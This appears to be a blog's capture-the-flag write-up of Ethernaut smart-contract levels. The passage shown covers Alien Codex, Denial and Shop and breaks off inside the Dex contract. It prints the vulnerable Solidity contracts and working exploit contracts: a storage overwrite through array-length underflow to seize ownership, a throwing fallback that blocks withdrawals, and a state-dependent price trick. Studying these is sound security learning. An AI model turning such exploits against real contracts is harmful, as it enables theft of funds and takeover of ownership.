<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="19 - Alien Codex12345678910111213141516171819202122232425262728293031&#x2F;&#x2F; SPDX-License-Identifier: MITpragma solidity ^0.5.0;import &amp;#x27;..&#x2F;helpers&#x2F;Ownable-05.sol&amp;#x27;;contract AlienCodex is Ownable">
<meta property="og:type" content="article">
<meta property="og:title" content="19-27 Ethernaut CTF">
<meta property="og:url" content="http://example.com/2022/11/17/19-27-Ethernaut-CTF/index.html">
<meta property="og:site_name" content="chandu kona">
<meta property="og:description" content="19 - Alien Codex12345678910111213141516171819202122232425262728293031&#x2F;&#x2F; SPDX-License-Identifier: MITpragma solidity ^0.5.0;import &amp;#x27;..&#x2F;helpers&#x2F;Ownable-05.sol&amp;#x27;;contract AlienCodex is Ownable">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2022-11-17T06:32:37.000Z">
<meta property="article:modified_time" content="2023-01-24T10:02:31.231Z">
<meta property="article:author" content="Chandu Kona">
<meta property="article:tag" content="SmartContract">
<meta property="article:tag" content="ethernaut">
<meta property="article:tag" content="ethereum">
<meta property="article:tag" content="solidity">
<meta property="article:tag" content="writeup">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>19-27 Ethernaut CTF</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/images/resume.pdf">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2022/12/01/Capture-The-Ether-CTF-Warmup-Lotteries/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2022/11/15/10-18-Ethernaut-CTF/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/11/17/19-27-Ethernaut-CTF/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/11/17/19-27-Ethernaut-CTF/&text=19-27 Ethernaut CTF"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/11/17/19-27-Ethernaut-CTF/&title=19-27 Ethernaut CTF"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/11/17/19-27-Ethernaut-CTF/&is_video=false&description=19-27 Ethernaut CTF"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=19-27 Ethernaut CTF&body=Check out this article: http://example.com/2022/11/17/19-27-Ethernaut-CTF/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/11/17/19-27-Ethernaut-CTF/&title=19-27 Ethernaut CTF"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/11/17/19-27-Ethernaut-CTF/&title=19-27 Ethernaut CTF"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/11/17/19-27-Ethernaut-CTF/&title=19-27 Ethernaut CTF"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/11/17/19-27-Ethernaut-CTF/&title=19-27 Ethernaut CTF"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/11/17/19-27-Ethernaut-CTF/&name=19-27 Ethernaut CTF&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/11/17/19-27-Ethernaut-CTF/&t=19-27 Ethernaut CTF"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#19-Alien-Codex"><span class="toc-number">1.</span> <span class="toc-text">19 - Alien Codex</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#20-Denial"><span class="toc-number">2.</span> <span class="toc-text">20 - Denial</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#21-Shop"><span class="toc-number">3.</span> <span class="toc-text">21 - Shop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#22-Dex"><span class="toc-number">4.</span> <span class="toc-text">22 - Dex</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#23-Dex-Two"><span class="toc-number">5.</span> <span class="toc-text">23 - Dex Two</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#24-Puzzle-Wallet"><span class="toc-number">6.</span> <span class="toc-text">24 - Puzzle Wallet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#25-Motorbike"><span class="toc-number">7.</span> <span class="toc-text">25 - Motorbike</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#26-DoubleEntryPoint"><span class="toc-number">8.</span> <span class="toc-text">26 - DoubleEntryPoint</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#27-Good-Samaritan"><span class="toc-number">9.</span> <span class="toc-text">27 - Good Samaritan</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        19-27 Ethernaut CTF
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Chandu Kona</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-11-17T06:32:37.000Z" itemprop="datePublished">2022-11-17</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/SmartContract/" rel="tag">SmartContract</a>, <a class="tag-link-link" href="/tags/ethereum/" rel="tag">ethereum</a>, <a class="tag-link-link" href="/tags/ethernaut/" rel="tag">ethernaut</a>, <a class="tag-link-link" href="/tags/solidity/" rel="tag">solidity</a>, <a class="tag-link-link" href="/tags/writeup/" rel="tag">writeup</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <hr>
<h2 id="19-Alien-Codex"><a href="#19-Alien-Codex" class="headerlink" title="19 - Alien Codex"></a>19 - Alien Codex</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;../helpers/Ownable-05.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">AlienCodex</span> is <span class="title class_">Ownable</span> &#123;</span><br><span class="line"></span><br><span class="line">  bool public contact;</span><br><span class="line">  bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">  modifier <span class="title function_">contacted</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">assert</span>(contact);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">make_contact</span>(<span class="params"></span>) public &#123;</span><br><span class="line">    contact = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">record</span>(<span class="params">bytes32 _content</span>) contacted public &#123;</span><br><span class="line">    codex.<span class="title function_">push</span>(_content);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">retract</span>(<span class="params"></span>) contacted public &#123;</span><br><span class="line">    codex.<span class="property">length</span>--;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">revise</span>(<span class="params">uint i, bytes32 _content</span>) contacted public &#123;</span><br><span class="line">    codex[i] = _content;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The goal is to claim ownership of this contract. If we look into the challenge, it inherits <code>Ownable</code>; hence the <code>first slot</code> contains <code>owner&#39;s address</code>, <code>second slot: contact (bool)</code>, and <code>third slot: length of codex array (bytes32[])</code>. Coming to the functions, there is the <code>make_contact()</code> function to make the <code>contact</code> variable <code>True</code> and <code>record</code> function to push an item into the array and <code>revise</code> to edit an item inside the array. These functions require <code>contact</code> to be <code>True</code>, but the <code>retract()</code> function is suspicious since it is decrementing the length of the array, and we can say that this function’s functionality is not related to the context of this smart contract. However, since this contract is not using <code>Safemath</code> multiple times, calling the <code>retract()</code> function can lead to an <code>underflow</code> of the length variable, and we can make the <strong>length of to <code>2^256</code></strong>. We can edit every slot of this smart contract’s memory. So we can become the <code>owner</code> by editing the first slot and replacing it with our address.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">AlienCodex</span> &#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">make_contact</span>(<span class="params"></span>) external;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">record</span>(<span class="params">bytes32 _content</span>) external;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">retract</span>(<span class="params"></span>) external;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">revise</span>(<span class="params">uint i, bytes32 _content</span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Exploit</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="title class_">AlienCodex</span> ac;</span><br><span class="line"></span><br><span class="line"><span class="title function_">constructor</span>(<span class="params">address _address</span>)&#123;</span><br><span class="line">    ac = <span class="title class_">AlienCodex</span>(_address);</span><br><span class="line">    ac.<span class="title function_">make_contact</span>();</span><br><span class="line">    ac.<span class="title function_">record</span>(<span class="title function_">bytes32</span>(<span class="title function_">bytes2</span>(<span class="number">0xffff</span>)));</span><br><span class="line">    ac.<span class="title function_">retract</span>();</span><br><span class="line">    ac.<span class="title function_">retract</span>();</span><br><span class="line">    ac.<span class="title function_">revise</span>(<span class="number">0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a</span>,<span class="title function_">bytes32</span>(<span class="number">2</span>**<span class="number">255</span> ^ <span class="number">2</span>**<span class="number">160</span> ^ <span class="title function_">uint256</span>(<span class="title function_">uint160</span>(msg.<span class="property">sender</span>))));</span><br><span class="line">      <span class="comment">// In [93]: hex( 2**256 - int(io.soliditySha3(abi_types=[&#x27;uint256&#x27;],values=[1]).hex(),16))</span></span><br><span class="line">      <span class="comment">// Out[93]: &#x27;0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="20-Denial"><a href="#20-Denial" class="headerlink" title="20 - Denial"></a>20 - Denial</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line">contract <span class="title class_">Denial</span> &#123;</span><br><span class="line"></span><br><span class="line">    address public partner; <span class="comment">// withdrawal partner - pay the gas, split the withdraw</span></span><br><span class="line">    address public constant owner = <span class="title function_">address</span>(<span class="number">0xA9E</span>);</span><br><span class="line">    uint timeLastWithdrawn;</span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint) withdrawPartnerBalances; <span class="comment">// keep track of partners balances</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setWithdrawPartner</span>(<span class="params">address _partner</span>) public &#123;</span><br><span class="line">        partner = _partner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// withdraw 1% to recipient and 1% to owner</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        uint amountToSend = <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> / <span class="number">100</span>;</span><br><span class="line">        <span class="comment">// perform a call without checking return</span></span><br><span class="line">        <span class="comment">// The recipient can revert, the owner will still get their share</span></span><br><span class="line">        partner.<span class="property">call</span>&#123;<span class="attr">value</span>:amountToSend&#125;(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="title function_">payable</span>(owner).<span class="title function_">transfer</span>(amountToSend);</span><br><span class="line">        <span class="comment">// keep track of last withdrawal time</span></span><br><span class="line">        timeLastWithdrawn = block.<span class="property">timestamp</span>;</span><br><span class="line">        withdrawPartnerBalances[partner] +=  amountToSend;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// allow deposit of funds</span></span><br><span class="line">    <span class="title function_">receive</span>() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// convenience function</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">contractBalance</span>(<span class="params"></span>) public view returns (uint) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>In this challenge, we <code>partner</code> need to block the <code>owner</code> from withdrawing the funds. Since we cannot use <code>revert()</code> like last time in the <code>King</code> challenge because this contract uses <code>call</code> instead of transfer. <strong>One way is to drain out the funds in the form of gas fee</strong> and the other easiest way is to use <code>throw</code> that is depreciated in the latest versions of solidity.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Exploit</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span>(<span class="params"></span>) external &#123;</span><br><span class="line">        <span class="keyword">throw</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="21-Shop"><a href="#21-Shop" class="headerlink" title="21 - Shop"></a>21 - Shop</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">Buyer</span> &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">price</span>(<span class="params"></span>) external view returns (uint);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Shop</span> &#123;</span><br><span class="line">  uint public price = <span class="number">100</span>;</span><br><span class="line">  bool public isSold;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">buy</span>(<span class="params"></span>) public &#123;</span><br><span class="line">    <span class="title class_">Buyer</span> _buyer = <span class="title class_">Buyer</span>(msg.<span class="property">sender</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_buyer.<span class="title function_">price</span>() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">      isSold = <span class="literal">true</span>;</span><br><span class="line">      price = _buyer.<span class="title function_">price</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>In this challenge, we need to overwrite the <code>price</code> variable to be less than <code>100,</code> but it is impossible since the contract checks if the <code>_buyer.price() &gt; price</code>. since we are the <code>_buyer</code> and we can make a smart contract that sends a high price during check and a low price while overriding, this can be done by tracking the <code>isSold</code> variable.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">Shop</span> &#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">buy</span>(<span class="params"></span>) external;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">isSold</span>(<span class="params"></span>) external view <span class="title function_">returns</span>(bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Exploit</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="title class_">Shop</span> s;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address _address</span>)&#123;</span><br><span class="line">    s = <span class="title class_">Shop</span>(_address);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">exploit</span>(<span class="params"></span>) public&#123;</span><br><span class="line">    s.<span class="title function_">buy</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">price</span>(<span class="params"></span>) public view <span class="title function_">returns</span>(<span class="params">uint</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> s.<span class="title function_">isSold</span>()? <span class="number">0</span> : <span class="number">100</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="22-Dex"><a href="#22-Dex" class="headerlink" title="22 - Dex"></a>22 - Dex</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;openzeppelin-contracts-08/access/Ownable.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Dex</span> is <span class="title class_">Ownable</span> &#123;</span><br><span class="line">  address public token1;</span><br><span class="line">  address public token2;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">setTokens</span>(<span class="params">address _token1, address _token2</span>) public onlyOwner &#123;</span><br><span class="line">    token1 = _token1;</span><br><span class="line">    token2 = _token2;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">addLiquidity</span>(<span class="params">address token_address, uint amount</span>) public onlyOwner &#123;</span><br><span class="line">    <span class="title class_">IERC20</span>(token_address).<span class="title function_">transferFrom</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), amount);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">swap</span>(<span class="params">address <span class="keyword">from</span>, address to, uint amount</span>) public &#123;</span><br><span class="line">    <span class="built_in">require</span>((<span class="keyword">from</span> == token1 &amp;&amp; to == token2) || (<span class="keyword">from</span> == token2 &amp;&amp; to == token1), <span class="string">&quot;Invalid tokens&quot;</span>);</span><br><span class="line">    <span class="built_in">require</span>(<span class="title class_">IERC20</span>(<span class="keyword">from</span>).<span class="title function_">balanceOf</span>(msg.<span class="property">sender</span>) &gt;= amount, <span class="string">&quot;Not enough to swap&quot;</span>);</span><br><span class="line">    uint swapAmount = <span class="title function_">getSwapPrice</span>(<span class="keyword">from</span>, to, amount);</span><br><span class="line">    <span class="title class_">IERC20</span>(<span class="keyword">from</span>).<span class="title function_">transferFrom</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), amount);</span><br><span class="line">    <span class="title class_">IERC20</span>(to).<span class="title function_">approve</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>), swapAmount);</span><br><span class="line">    <span class="title class_">IERC20</span>(to).<span class="title function_">transferFrom</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>), msg.<span class="property">sender</span>, swapAmount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">getSwapPrice</span>(<span class="params">address <span class="keyword">from</span>, address to, uint amount</span>) public view <span class="title function_">returns</span>(<span class="params">uint</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>((amount * <span class="title class_">IERC20</span>(to).<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)))/<span class="title class_">IERC20</span>(<span class="keyword">from</span>).<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address spender, uint amount</span>) public &#123;</span><br><span class="line">    <span class="title class_">SwappableToken</span>(token1).<span class="title function_">approve</span>(msg.<span class="property">sender</span>, spender, amount);</span><br><span class="line">    <span class="title class_">SwappableToken</span>(token2).<span class="title function_">approve</span>(msg.<span class="property">sender</span>, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address token, address account</span>) public view returns (uint)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">IERC20</span>(token).<span class="title 